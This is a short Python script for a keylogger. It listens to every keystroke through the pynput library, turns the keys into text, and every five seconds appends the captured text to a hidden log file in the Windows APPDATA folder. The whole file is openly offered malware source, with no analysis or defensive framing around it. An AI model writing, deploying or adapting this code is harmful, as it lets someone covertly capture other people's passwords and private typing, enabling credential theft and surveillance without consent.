#! /usr/bin/python
import pynput.keyboard
import threading
import os

keys = ""
path = os.environ["appdata"] + "\\keylogger.txt"
#path ="log.txt"


def process_keys(key):
    global keys
    try:
        keys = keys + str(key.char)
    except AttributeError:
        if key == key.space:
            keys = keys + " "
        elif key == key.enter:
            keys = keys + ""
        elif key == key.right:
            keys = keys + ""
        elif key == key.left:
            keys = keys + ""
        elif key == key.down:
            keys = keys + ""
        elif key == key.up:
            keys = keys + ""
        elif key == key.ctrl_l:
            keys = keys + ""
        elif key == key.shift:
            keys = keys + ""
        elif key == key.esc:
            keys = keys + ""
        elif key == key.caps_lock:
            keys = keys + ""
        elif key == key.tab:
            keys = keys + ""
        elif key == key.shift_r:
            keys = keys + ""
        elif key == key.ctrl_r:
            keys = keys + ""
        else:
            keys = keys + " " + str(key) + " "


def report():
    global keys
    global path
    fin = open(path, "a")
    fin.write(keys)
    keys =""
    fin.close()
    # print(keys)
    timer = threading.Timer(5, report)
    timer.start()


# with key_listener:
#     report()
#     key_listener.join()

def start():
	key_listener = pynput.keyboard.Listener(on_press=process_keys)
	with key_listener:
        	report()
	        key_listener.join()
